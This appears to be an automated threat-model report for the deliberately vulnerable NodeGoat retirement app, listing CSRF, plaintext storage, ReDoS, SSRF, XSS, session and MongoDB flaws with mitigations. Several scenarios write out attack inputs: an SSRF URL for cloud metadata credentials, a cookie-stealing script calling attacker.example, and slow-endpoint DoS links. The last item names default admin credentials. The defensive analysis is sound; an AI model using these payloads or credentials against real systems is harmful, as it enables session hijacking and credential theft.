No CSRF token is required or verified for POST /profile; the form at app/views/profile.html:38 carries only the profile fields.
Session cookies are sent on cross-site form posts.
threats.impactReason: Redirecting a retirement account's bank routing details to an attacker-controlled account has direct financial consequence.
threats.likelihoodReason: Only requires a logged-in victim to visit an attacker-controlled page, though it depends on cookie SameSite behaviour. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Require and verify a per-session CSRF token on the profile update form.
steps: Register csurf (or equivalent) middleware on the POST /profile route in app/routes/index.js.
Emit the token as a hidden input in the form at app/views/profile.html:38 and reject mismatching submissions in handleProfileUpdate.
Set SameSite=Strict on the session cookie.

threats.title: Profile fields stored unencrypted in the users collection after POST /profile
threats.asset: SSN, date of birth, bank account and routing numbers at rest
threats.attackScenario: After a user submits POST /profile, ProfileDAO.updateUser at app/data/profile-dao.js:42-60 writes ssn, dob, bankAcc and bankRouting into the `users` collection as plain strings — the encrypt/decrypt helpers at app/data/profile-dao.js:15-40 are commented out — so anyone who obtains a MongoDB dump or reaches the database reads every user's SSN and bank numbers directly.
assumptions: The MongoDB deployment does not provide field- or storage-level encryption that compensates for the disabled application-level encryption.
threats.impactReason: Every user's SSN, DOB and bank account/routing numbers are readable in a single collection dump.
threats.likelihoodReason: Requires database or backup access, but the application-level encryption path is visibly disabled in source.

mitigation.summary: Re-enable field-level encryption for sensitive profile fields.
steps: Uncomment and fix the crypto helpers at app/data/profile-dao.js:15-40, using a per-record random IV stored alongside the ciphertext rather than on the shared config object.
Encrypt ssn, dob, bankAcc and bankRouting in updateUser before the collection write and decrypt in getByUserId.
Keep the key in an environment-provided secret rather than config/config.js.

threats.title: SSN, date of birth and bank details submitted over cleartext HTTP on POST /profile
threats.asset: SSN, date of birth, bank account and routing numbers
threats.attackScenario: An attacker sharing a network with a user passively captures the plaintext POST /profile body (route at app/routes/index.js:48) and reads the `ssn`, `dob`, `bankAcc` and `bankRouting` form fields defined in app/views/profile.html:49-60, along with the session cookie in the request headers.
assumptions: No TLS termination is in place, so traffic including credentials and sensitive personal data is sent over plain HTTP.
The application is reachable over plain HTTP without HSTS or a forced HTTPS redirect.
threats.impactReason: Full identity and banking data for the user is disclosed in one captured request, enabling identity theft.
threats.likelihoodReason: Passive capture on shared or hostile networks is straightforward when no TLS redirect or HSTS is present. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Force TLS for the profile flow and set secure cookies.
steps: Redirect all HTTP requests to HTTPS and emit Strict-Transport-Security in the Express app bootstrap.
Set `secure: true` and `httpOnly: true` on the session cookie.
Serve the profile form only over HTTPS so the form action never downgrades.

threats.title: Catastrophic regex backtracking on the bankRouting field stalls the Node event loop
threats.asset: availability of the RetireEasy application for all users
threats.attackScenario: An attacker posts to /profile with `bankRouting` set to a long run of digits with no trailing `#` (for example 40 zeros); the nested-quantifier pattern `/([0-9]+)+\#/` at app/routes/profile.js:59 backtracks exponentially and pins the single Node.js event loop, so every other user's request hangs.
assumptions: The regex is evaluated against the raw bankRouting value before any length cap is applied.
threats.impactReason: A single-threaded Node process is blocked, denying service to all users until the request is killed.
threats.likelihoodReason: Any authenticated user can send one crafted form field; the vulnerable pattern is present in source.

mitigation.summary: Replace the nested-quantifier regex and bound the input length.
steps: Change the pattern at app/routes/profile.js:59 to `/([0-9]+)\#/` as the in-file comment describes.
Reject bankRouting values longer than a fixed maximum before the regex runs.
Add rate limiting to POST /profile in app/routes/index.js.

threats.title: Outbound research fetch accepts an attacker-chosen, possibly plaintext endpoint
threats.asset: fetched stock quote HTML delivered to users
threats.attackScenario: The research-outbound flow crosses a trust boundary to a stock quote site whose address comes entirely from the client's url parameter, so an attacker (or a network position on a plaintext http:// target they supply) substitutes or rewrites the upstream server and the Research Handler presents attacker-controlled quote content to the user as if it came from the application.
assumptions: No allowlist or scheme restriction pins the outbound request to an HTTPS quote provider, so http:// targets are accepted.
needle's default certificate verification is not sufficient protection when the attacker chooses the hostname and scheme.
threats.impactReason: Users are shown financial data from an unauthenticated source, which can mislead trading decisions, but no stored data is altered.
threats.likelihoodReason: The destination is chosen by whoever crafts the request URL, though exploiting the plaintext variant additionally requires a network foothold.

mitigation.summary: Pin the outbound flow to a configured HTTPS provider with certificate verification.
steps: Hardcode the provider base URL in config/config.js and reject any client-supplied scheme or host in app/routes/research.js.
Ensure needle is invoked with rejectUnauthorized: true so TLS certificates are verified.
Log the resolved outbound URL for each /research call to support later review.

threats.title: Fetched remote HTML echoed into the response enables stored-free XSS and response injection
threats.asset: victim browser sessions on the application's origin
threats.attackScenario: Because app/routes/research.js:25 writes the raw body returned by needle.get into the response with Content-Type text/html, an attacker sends a victim the link GET /research?url=https://attacker.example/payload.html&symbol= so that attacker-authored script is served from the application's own origin and can read the victim's session cookie or issue authenticated requests.
assumptions: Session cookies for the application are not marked HttpOnly, or the injected script is used to perform actions as the victim rather than steal the cookie.
threats.impactReason: Script executing on the application origin can act as any victim who follows the link, including administrative users.
threats.likelihoodReason: Only a crafted link is needed; the route is a GET with no CSRF or auth obstacle to the fetch itself.

mitigation.summary: Never echo a fetched third-party body as HTML on this origin.
steps: Parse the fetched response server-side and render only extracted, escaped fields through the existing research.html template instead of res.write(body) at app/routes/research.js:25.
If raw passthrough is required, set Content-Type to text/plain and a restrictive Content-Security-Policy header on the response.
Restrict the fetch target to the configured quote provider so untrusted origins cannot supply the body.

threats.title: Server-side request forgery via the url parameter on GET /research
threats.asset: outbound server-side request capability and internal-only HTTP endpoints (e.g. cloud metadata)
threats.attackScenario: The handler at app/routes/research.js:15 builds the request target by concatenating req.query.url and req.query.symbol with no scheme or host allowlist, so an attacker requests GET /research?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/&symbol=role and the server fetches the internal metadata endpoint with needle.get and writes the returned body straight back in the response at line 25.
assumptions: The application is deployed in an environment where internal-only HTTP services (metadata service, admin ports, internal APIs) are reachable from the app server's network position.
The hidden `url` field in app/views/research.html is only a client-side default and is not re-validated server-side.
The server has network reachability to internal addresses such as link-local metadata or localhost services.
threats.impactReason: The attacker turns the server into a proxy for the internal network and reads the responses verbatim, which can yield cloud credentials or internal service data.
threats.likelihoodReason: The url field is a plain hidden form input on a GET route, trivially overridden by editing the query string; no authentication step guards the concatenation.

mitigation.summary: Stop accepting the target URL from the client; build it server-side from a fixed base and a validated symbol.
steps: Remove the use of req.query.url in app/routes/research.js:15 and hardcode the quote provider base URL in config/config.js.
Validate req.query.symbol against a strict pattern such as /^[A-Za-z.-]{1,10}$/ and reject anything else with a 400 before calling needle.get.
If multiple providers must be supported, map a provider key to an entry in a server-side allowlist rather than passing a raw URL.
Remove the hidden url input from app/views/research.html:17 so the form no longer submits a target.

threats.title: Unbounded outbound fetch on GET /research exhausts server connections
threats.asset: availability of the application's request-handling workers
threats.attackScenario: needle.get at app/routes/research.js:16 is called with no timeout, response size limit or concurrency cap, so an attacker repeatedly requests GET /research?url=http://attacker.example/slowloris&symbol=x pointing at a server that never finishes responding, pinning Node's outbound sockets and pending response objects until the application stops serving other users.
assumptions: No rate limiting is applied in front of the /research route.
No reverse proxy or platform-level request timeout terminates the pending /research responses.
threats.impactReason: Sustained requests degrade or halt the whole single-process Node application, though no data is lost.
threats.likelihoodReason: The route is a simple GET and the attacker controls the target host, but the attack requires a controlled slow/large endpoint and repeated traffic.

mitigation.summary: Bound the outbound request in time, size and rate.
steps: Pass needle options { open_timeout: 3000, response_timeout: 5000, read_timeout: 5000 } to the needle.get call in app/routes/research.js:16.
Cap the number of bytes written back to the client and abort the upstream request beyond that cap.
Apply an express rate limiter to the /research route registration in app/routes/index.js.

threats.title: Credentials and session cookie on the /research request exposed if the flow is served over plain HTTP
threats.asset: session cookie authenticating the RetireEasy user
threats.attackScenario: The research-request flow is described as HTTP and crosses a trust boundary carrying the session cookie with the GET /research?url=&symbol= request, so an attacker on the same café or corporate network captures the cookie header in transit and replays it to impersonate the user against /allocations and /contributions.
assumptions: No TLS termination is in place, so traffic including credentials and sensitive personal data is sent over plain HTTP.
The application is reachable over plain HTTP without HSTS or a TLS-terminating proxy redirect.
The session cookie is not marked Secure, so it is sent on cleartext requests.
threats.impactReason: A captured session cookie gives full account takeover of a retirement-savings account without needing the password.
threats.likelihoodReason: Requires the attacker to be positioned on the network path, which is common on shared wireless but not universal. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Force TLS for all browser-to-application traffic and mark session cookies Secure.
steps: Terminate TLS in front of the Express app and redirect all http:// requests to https://.
Set `secure: true` and `httpOnly: true` on the express-session cookie options in the application server configuration.
Add Strict-Transport-Security via helmet so browsers never retry over cleartext.

threats.title: Reflected untrusted remote content injected into the /research response
threats.asset: session cookie of the victim's authenticated RetireEasy session
threats.attackScenario: Because the research-request flow lets the caller set `url`, app/routes/research.js:16-25 fetches that URL and writes the remote `body` verbatim into a text/html response with no escaping or sandboxing, so an attacker sends a logged-in victim a link to GET /research?url=https://attacker.example/xss.html&symbol=x and the attacker's script executes on the application's origin and exfiltrates the session cookie.
assumptions: No Content-Security-Policy restricts inline script execution on the /research response.
The session cookie is not marked HttpOnly, or the injected script performs authenticated same-origin requests instead of reading the cookie directly.
threats.impactReason: Script running on the application origin can act as the victim, reading dashboard, contributions and allocations data or hijacking the session.
threats.likelihoodReason: The link is trivially craftable and requires only that a signed-in user click it; no server-side filtering stands in the way.

mitigation.summary: Never echo fetched third-party bodies into the application's own HTML response.
steps: Parse the fetched response in app/routes/research.js and render only extracted, escaped fields through the nunjucks template instead of res.write(body).
If raw content must be shown, serve it with Content-Type: text/plain or from a separate sandboxed origin.
Add a Content-Security-Policy header via helmet in the Express app configuration to block inline scripts.

threats.title: Server-side fetch on /research used to exhaust the Node process and amplify traffic
threats.asset: availability of the RetireEasy application process and its outbound bandwidth
threats.attackScenario: The research-request flow lets the caller choose the fetch target and app/routes/research.js:16 calls needle.get with no timeout, size limit or request throttle, so an attacker repeatedly issues GET /research?url=http://slowserver.attacker.example/&symbol=x to pin many long-lived outbound sockets and buffer multi-gigabyte bodies into memory before the response is written back.
assumptions: No reverse proxy in front of the application caps request rate or upstream response size.
threats.impactReason: Sustained memory and socket exhaustion takes the single-process Node application offline for all users, and the server can be used to flood third parties.
threats.likelihoodReason: Unlimited concurrent requests can be sent to a GET route whose fetch target the attacker fully controls.

mitigation.summary: Bound and rate-limit the outbound fetch performed by /research.
steps: Pass `open_timeout`, `read_timeout` and `response_timeout` options to needle.get in app/routes/research.js.
Cap the accepted response size and abort the stream when it is exceeded.
Apply an express rate limiter to the /research route in app/routes/index.js.

threats.title: Admin authorisation depends only on a session userId lookup with no re-authentication or session binding
threats.asset: admin role flag and the administrative benefits functions it protects
threats.attackScenario: isAdminUserMiddleware at app/routes/session.js:25-34 trusts whatever `req.session.userId` holds and looks the user up with getUserById, so an attacker who obtains or fixates a victim's session identifier (no rotation on login is performed in handleLoginRequest at app/routes/session.js:53) reuses that cookie indefinitely to act as that user, and as an administrator if the account carries isAdmin.
assumptions: Sessions do not carry a short absolute expiry.
The session id is not regenerated on successful login, so a pre-set session identifier remains valid after authentication.
threats.impactReason: A reused or fixated session grants the victim's full privileges, including admin benefits editing when the victim is an admin.
threats.likelihoodReason: Requires first obtaining or planting a session identifier, but the login flow offers no rotation barrier once that is done.

mitigation.summary: Regenerate the session on login and bound session lifetime.
steps: Call req.session.regenerate() before setting req.session.userId in handleLoginRequest at app/routes/session.js:53.
Set an explicit cookie maxAge and rolling expiry in the express-session configuration.
Destroy the server-side session, not just the cookie, in the GET /logout handler.

threats.title: MongoDB reachable without authentication, permitting direct tampering with user documents and the isAdmin flag
threats.asset: user documents including the admin role flag and stored passwords
threats.attackScenario: The connection string in docker-compose.yml:8 and config/env/all.js:3 carries no username or password, so an attacker who reaches port 27017 on the mongo service connects directly and sets `isAdmin: true` on their own user document in the users collection, after which isAdminUserMiddleware at app/routes/session.js:25 promotes their existing session to administrator.
assumptions: The MongoDB instance runs without authentication enabled, as the credential-free connection strings imply.
The application connects to MongoDB without authentication or with excessive privileges, as shown in the default docker-compose configuration.
The application's database principal, if any, is not restricted to least privilege on the users collection.
threats.impactReason: Direct write access to the users collection yields administrator privilege and control of every stored credential and profile record.
threats.likelihoodReason: Port 27017 is only exposed inside the compose network, so an attacker needs adjacent network access or a container escape first. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Enable MongoDB authentication with a least-privilege application user.
steps: Create an application user limited to readWrite on the nodegoat database and put its credentials in MONGODB_URI via environment variables in docker-compose.yml.
Start the mongo service with --auth and bind it to the internal network only.
Deny the application principal write access to the isAdmin field by moving role assignment to a separate administrative collection or role check.

threats.title: Session cookie secret is a hardcoded literal, allowing session forgery and admin impersonation
threats.asset: session identifiers and the admin role flag
threats.attackScenario: config/env/all.js:8 defines `cookieSecret` as a source literal rather than reading process.env, so an attacker who reads the public repository signs their own session cookie carrying a `userId` belonging to an admin account and then passes isLoggedInMiddleware and isAdminUserMiddleware in app/routes/session.js:25-42 without ever calling POST /login.
assumptions: The deployment does not override cookieSecret from the environment.
The express-session middleware is configured with the cookieSecret value exported from config/env/all.js.
threats.impactReason: A forged session grants full admin access to benefits administration and every user's profile data including SSN and bank details.
threats.likelihoodReason: The secret is committed in configuration and the login/session endpoints are reachable by any unauthenticated network client.

mitigation.summary: Load the session signing secret from the environment and rotate the committed value.
steps: Replace the literal in config/env/all.js:8 with `process.env.COOKIE_SECRET` and fail startup if it is unset.
Rotate the secret and invalidate existing sessions.
Set MONGODB_URI-style environment injection for the secret in docker-compose.yml instead of committing it.

threats.title: Signup stores user passwords in plaintext in the users collection
threats.asset: user credentials (plaintext passwords)
threats.attackScenario: addUser in app/data/user-dao.js:17-31 writes the raw `password` request parameter straight into the user document with the bcrypt.hashSync line commented out, so an attacker who reaches the users collection (for example through any read of user documents or a database dump) obtains every account's cleartext password submitted via POST /signup and replays it at POST /login and on other sites.
threats.impactReason: Every registered account's password, including any admin account, is recoverable verbatim and reusable across systems.
threats.likelihoodReason: The condition is present in code on the signup path that every user exercises; exploitation needs only one read of the users collection or a backup.

mitigation.summary: Hash passwords with bcrypt on signup and verify with bcrypt.compare on login.
steps: Uncomment and use `password: bcrypt.hashSync(password, bcrypt.genSaltSync())` in addUser at app/data/user-dao.js:25-30 and remove the raw `password` field.
Change comparePassword in validateLogin (app/data/user-dao.js:57) to use bcrypt.compareSync against the stored hash.
Migrate existing plaintext records by rehashing on next successful login and forcing a password reset.

threats.title: Plaintext passwords and SSN/bank fields traverse the MongoDB connection unprotected
threats.asset: plaintext user passwords and profile SSN/bank account fields in transit to MongoDB
threats.attackScenario: docker-compose.yml:8 points the app at `mongodb://mongo:27017/nodegoat` with no TLS parameters, so an attacker with a foothold on the container network sniffs the wire-protocol insert performed by addUser (app/data/user-dao.js:45) and reads every signup password in cleartext along with the profile documents updateUser writes unencrypted at app/data/profile-dao.js:42.
assumptions: An attacker can observe traffic on the docker bridge network between the web and mongo services.
The MongoDB deployment does not require TLS on port 27017 and the driver is not configured with tls=true elsewhere.
threats.impactReason: Cleartext credentials plus SSN and bank routing numbers are exposed for every user who signs up or edits their profile.
threats.likelihoodReason: Requires network position inside the deployment, but the connection string shows no transport protection at all.

mitigation.summary: Require TLS on the MongoDB connection and stop sending cleartext secrets.
steps: Add `?tls=true` (and a CA file) to MONGODB_URI in docker-compose.yml:8 and enable TLS on the mongo service.
Hash passwords before the insert in app/data/user-dao.js so the wire never carries cleartext credentials.
Restore the crypto-based encrypt/decrypt helpers commented out at app/data/profile-dao.js:15-40 for ssn and bank fields.

threats.title: Login and signup outcomes are not audited, leaving credential attacks unattributable
threats.asset: authentication audit trail for user accounts
threats.attackScenario: handleLoginRequest at app/routes/session.js:53 emits only console.log redirect messages and records no authenticated identity, source address or outcome for POST /login and POST /signup, so an attacker who brute-forces credentials or signs in with a stolen plaintext password leaves no record distinguishing their sessions from the legitimate user's and the account owner cannot dispute the resulting profile or benefits changes.
assumptions: No external access or audit logging middleware records authentication outcomes ahead of the session routes.
threats.impactReason: Account takeover and subsequent changes to SSN, bank details and allocations cannot be attributed or reconstructed.
threats.likelihoodReason: The gap is passive and affects every authentication attempt, but it only matters once another attack succeeds.

mitigation.summary: Add structured authentication audit logging around login, signup and logout.
steps: Log userName, resolved userId, source IP and success/failure for each call in handleLoginRequest and handleSignup in app/routes/session.js, without logging the password.
Emit the same record on GET /logout so session lifetimes are reconstructable.
Ship these records to an append-only store outside the application container.

threats.title: Loss of the single MongoDB instance halts all authentication and data access
threats.asset: availability of user login and of allocation, contribution and profile records
threats.attackScenario: Every DAO in app/data (user-dao.js:15, allocations-dao.js:15, contributions-dao.js:14, memos-dao.js:13, benefits-dao.js:13) shares the single unauthenticated mongo service declared in docker-compose.yml:13-17, so an attacker with network reach to port 27017 issues unbounded queries or drops the users collection and every login through POST /login fails until the database is restored.
assumptions: MongoDB runs as a single instance with no replica set, connection quota or resource limits.
No backup or automated restore path exists for the nodegoat database.
The application connects to MongoDB without authentication or with excessive privileges, as shown in the default docker-compose configuration.
threats.impactReason: A single database failure makes authentication and all user data unavailable with no redundancy.
threats.likelihoodReason: Requires access to the internal compose network, since port 27017 is only exposed between services. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Authenticate, constrain and back up the MongoDB deployment.
steps: Enable authentication and a least-privilege application role so arbitrary clients cannot issue destructive commands.
Add CPU/memory limits and a connection pool cap for the mongo service in docker-compose.yml.
Configure scheduled dumps of the nodegoat database and test restore.

threats.title: Attacker-controlled url parameter on GET /research redirects the server-side fetch to any destination (SSRF)
threats.asset: internal HTTP-reachable resources and cloud instance metadata credentials returned through the /research response body
threats.attackScenario: The research handler builds the fetch target as `req.query.url + req.query.symbol` at app/routes/research.js:15 and passes it straight to needle.get with no allowlist, so an attacker requests GET /research?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/&symbol=role and the server returns the instance metadata credentials inline in the HTML response body, spoofing a legitimate quote fetch to the Yahoo endpoint declared in the hidden field at app/views/research.html:17.
assumptions: The application runs in an environment where link-local metadata or internal-only HTTP services are reachable from the server's network position.
threats.impactReason: A successful fetch of the metadata endpoint or an internal admin service yields credentials or internal data that lead to full compromise of the hosting account.
threats.likelihoodReason: The url parameter is a plain GET query value on an unauthenticated-reachable page and needs only a crafted URL, no special position.

mitigation.summary: Stop accepting the destination from the request and restrict needle.get to a fixed allowlisted host.
steps: Remove `req.query.url` from app/routes/research.js:15 and hardcode the quote base URL server-side.
Validate `req.query.symbol` against a strict pattern such as /^[A-Za-z.-]{1,10}$/ and reject anything else before building the URL.
Resolve and check the final host against an allowlist of permitted domains, rejecting private, loopback and link-local IP ranges, and disable redirect following in the needle options.
Delete the hidden `url` field from app/views/research.html:17 so the client no longer supplies the destination.

threats.title: Remote page content fetched by /research is written unescaped into the response, letting a hostile quote site run script in the app's origin
threats.asset: the victim user's NodeGoat session cookie and authenticated actions
threats.attackScenario: app/routes/research.js:24-26 writes the third-party response `body` verbatim into a text/html response, so an attacker sends a victim the link GET /research?url=https://attacker.example/&symbol=x, the hostile site returns `<script>fetch('https://attacker.example/c?'+document.cookie)</script>`, and that script executes on the application's own origin and exfiltrates the victim's session cookie.
assumptions: Session cookies for the application are not marked HttpOnly, or the injected script can act on the user's behalf using the ambient session regardless.
threats.impactReason: Script executing on the application origin can hijack the victim's session and perform authenticated actions such as changing benefits or profile data.
threats.likelihoodReason: Only a crafted link and a victim click are needed; the attacker fully controls both the fetched host and its response body.

mitigation.summary: Never echo remote content into the application's own HTML response.
steps: Parse the fetched document in app/routes/research.js and render only extracted, escaped fields (symbol, price) through the existing nunjucks `research` template.
If raw content must be displayed, serve it with Content-Type: text/plain or from a separate sandboxed origin.
Add a Content-Security-Policy response header restricting script-src to self for the /research route.

threats.title: Unbounded server-side fetch on /research allows resource exhaustion against the Node process
threats.asset: availability of the NodeGoat web application
threats.attackScenario: needle.get at app/routes/research.js:16 is called with no timeout, size limit or concurrency cap, so an attacker issues repeated GET /research?url=http://attacker.example/slow-infinite-stream&symbol= requests that each hold a socket open and stream an endless body into memory until the Node process stops serving other users.
assumptions: No reverse proxy or rate limiter in front of the application caps concurrent /research requests or upstream response size.
threats.impactReason: The single-process Node server becomes unresponsive for all users, though no data is lost.
threats.likelihoodReason: Any client can trigger the fetch, but the attacker must host or point at a slow endpoint and sustain the requests.

mitigation.summary: Bound the outbound fetch and the rate at which it can be triggered.
steps: Pass `open_timeout`, `response_timeout` and `read_timeout` options to needle.get in app/routes/research.js:16.
Cap the accepted response size and abort the stream once exceeded.
Apply a per-IP rate limit to the /research route in app/routes/index.js.

threats.title: Session cookie observable on unauthenticated tutorial browsing over cleartext HTTP
threats.asset: session cookie of a logged-in user browsing /tutorial
threats.attackScenario: The tutorial-browse flow is HTTP and crosses a trust boundary, and a logged-in user following the /tutorial/a1 link in app/views/layout.html sends their session cookie on that request, so a network attacker sniffs the cleartext GET /tutorial/a1 request and replays the captured cookie against /profile and /allocations.
assumptions: No TLS termination is in place, so traffic including credentials and sensitive personal data is sent over plain HTTP.
The application is served over plain HTTP without HSTS or a TLS redirect.
The session cookie has no Secure attribute so it accompanies cleartext tutorial requests.
threats.impactReason: A replayed session cookie yields full impersonation of the victim's retirement-savings account.
threats.likelihoodReason: Needs an attacker on the network path; the tutorial pages themselves are frequently visited while authenticated. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Serve all routes including /tutorial over TLS and mark session cookies Secure.
steps: Redirect http:// to https:// at the proxy or in the Express app entry point.
Set `cookie: { secure: true, httpOnly: true, sameSite: 'lax' }` on the express-session configuration.
Enable helmet's HSTS middleware.

threats.title: Tutorial pages render third-party iframes and vendor assets without a Content-Security-Policy
threats.asset: integrity of the tutorial pages rendered in the user's browser and the session cookie they carry
threats.attackScenario: Responses on the tutorial-browse flow embed remote iframes such as the one at app/views/tutorial/ssrf.html:23 and app/views/tutorial/a7.html:30 plus the `environmentalScripts` values injected by app/routes/tutorial.js:33, and with no Content-Security-Policy or frame-ancestors header an attacker who can influence any of those remote or injected script sources executes JavaScript on the application origin against every tutorial visitor.
assumptions: No Content-Security-Policy or X-Frame-Options header is set by middleware in front of the tutorial router.
The `environmentalScripts` template variable can resolve to externally hosted script URLs in some deployments.
threats.impactReason: Script execution on the application origin can reach the authenticated session of any user who happens to be signed in.
threats.likelihoodReason: Requires compromising or controlling one of the embedded third-party sources rather than a direct request the attacker sends.

mitigation.summary: Add a restrictive Content-Security-Policy and frame controls to all rendered pages.
steps: Enable helmet's contentSecurityPolicy middleware in the Express app setup with explicit script-src and frame-src allowlists.
Pin the embedded iframes in app/views/tutorial/*.html to the exact permitted origins and add sandbox attributes.
Validate that `environmentalScripts` from config/config.js only ever yields locally served script paths.

threats.title: Tutorial pages advertise exploitable routes and parameters of the live instance
threats.asset: tutorial content describing the deployed application's own vulnerable endpoints
threats.attackScenario: GET /tutorial/ssrf is served without authentication by app/routes/tutorial.js:31, and app/views/tutorial/ssrf.html:20-32 names the live /research endpoint, quotes the vulnerable `req.query.url+req.query.symbol` code and links /benefits directly, so an anonymous attacker browses the tutorial index and is handed a working exploitation recipe against the same running deployment.
assumptions: The tutorial routes are exposed on the same deployment that hosts the vulnerable application routes.
threats.impactReason: It removes all discovery effort for the SSRF and access-control flaws in the same instance, but discloses no user data by itself.
threats.likelihoodReason: Every /tutorial/<page> URL is linked from app/views/tutorial/layout.html and requires no credentials.

mitigation.summary: Do not ship the tutorial routes alongside a reachable deployment, or require authentication for them.
steps: Mount the tutorial router in app/routes/index.js only when an explicit development flag is set.
Otherwise require isLoggedIn (and ideally isAdmin) middleware on the router in app/routes/tutorial.js.

threats.title: Tutorial pages leak the built-in admin credentials to unauthenticated visitors
threats.asset: default administrator account credentials (user: admin, password: Admin_123)
